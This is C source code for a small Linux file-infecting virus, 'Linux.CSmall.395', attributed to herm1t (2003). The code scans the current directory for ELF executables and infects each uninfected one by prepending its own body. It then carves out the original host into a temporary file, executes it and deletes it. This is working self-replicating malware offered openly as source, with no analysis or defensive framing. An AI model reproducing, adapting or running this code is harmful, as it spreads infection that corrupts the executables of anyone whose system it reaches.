/* 
 * Virus Linux.CSmall.395 (c) 2003 by herm1t (herm1t@netlux.org)
 *
 * By using this file, you agree to the terms and conditions set
 * forth in the COPYING file which can be found at the top level
 * of this distribution.
 */
#include<csmall.h>

void main(int argp)
{
	REG(int (*syscall)(int,...),	edi)
	uchar	*buf;
	int	i, j, k, v;
	uchar	_buf[80];

	SYSCALL
	buf	= _buf;
	syscall = (int(*)(int,...))((int)(main) - 7);
	v = U(ELF_BASE + 0x44);
	k = open(cur_dir, O_RDONLY);
	while (readdir(k, buf) == 1) {
		j = open(buf + DIRENT_DNAME, O_RDWR);
		read(j, buf, 72);
		i = lseek(j, -1, SEEK_END);
		if ((U(buf) == U(ELF_BASE)) &&
		    (U(buf + 0x44) != v) &&
		    (U(buf + 16) == U(ELF_BASE + 16)))
			do {
				pread1(j, buf, i);
				pwrite1(j, buf, i + v);
				if (i < v)
					pwrite1(j, i + ELF_BASE, i);
			} while (--i >= 0);
		close(j);
	}
	
	buf = (uchar*)tmp_dir;
	for ( i = U(ELF_BASE + 0x40); C(--i); );
	for ( j = k = ++i; C(k++) == 0x2f ? j = k : 0, C(k); );
	for ( k = UI(buf + 5); (C(k++) = C(j++)); );

	k = open(i, O_RDONLY);
	j = creat(buf, syscall); /* 100115 */
	while (write(j, i, pread1(k, i, v++)) == 1);
	close(j);
	
	if (fork() == 0)
		execve(buf, &argp, 4 + UI(&argp) + 4 * ARGC);
	else
		waitpid(-1, i, 0);
	unlink(buf);
	exit(WEXITSTATUS(U(i)));
	EOV
}
